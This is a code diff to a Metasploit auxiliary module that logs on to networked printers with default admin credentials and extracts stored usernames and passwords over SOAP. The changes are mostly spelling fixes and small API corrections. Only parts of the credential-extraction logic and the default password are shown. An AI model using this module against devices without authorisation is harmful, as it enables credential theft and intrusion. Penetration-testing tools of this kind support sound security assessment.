@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'rex/proto/http'
+
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -29,7 +29,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT('50001'),
-        OptString.new('USER', [false, 'The default Admin user', 'Admin']),
+        OptString.new('USER', [true, 'The default Admin user', 'Admin']),
         OptString.new('PASSWD', [true, 'The default Admin password', '12345678']),
         OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])
 
@@ -130,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
       'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'
     }, datastore['TIMEOUT'].to_i)
     if response.nil?
-      print_error("No reponse from device")
+      print_error("No response from device")
       return
     else
       xml0_body = ::Nokogiri::XML(response.body)
@@ -148,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
   # This section logs on and retrieves AuthKey token
   def login(major, minor)
     authreq_xml = generate_authkey_request_xlm(major, minor)
-    # Send post request with crafted XML to login and retreive AuthKey
+    # Send post request with crafted XML to login and retrieve AuthKey
     begin
       response = send_request_cgi(
       {
@@ -157,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
         'data'   => authreq_xml.to_xml
       }, datastore['TIMEOUT'].to_i)
       if response.nil?
-        print_error("No reponse from device")
+        print_error("No response from device")
         return
       else
         xml1_body = ::Nokogiri::XML(response.body)
@@ -173,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
   # This section post xml soap message that will extract usernames and passwords
   def extract(major, minor, authkey)
     if (authkey != '')
-      # create xml request to extract user credintial settings
+      # create xml request to extract user credential settings
       smbreq_xml = generate_pwd_request_xlm(major, minor, authkey)
       # Send post request with crafted XML as data
       begin
@@ -184,7 +184,7 @@ class MetasploitModule < Msf::Auxiliary
           'data'   => smbreq_xml.to_xml
         }, datastore['TIMEOUT'].to_i)
         if response.nil?
-          print_error("No reponse from device")
+          print_error("No response from device")
           return
         else
           xml2_body = ::Nokogiri::XML(response.body)
@@ -229,7 +229,7 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
       origin_type: :service,
       module_fullname: self.fullname,
-      workspace_id: myworkspace.id,
+      workspace_id: myworkspace_id,
       private_data: password,
       private_type: :password,
       username: username
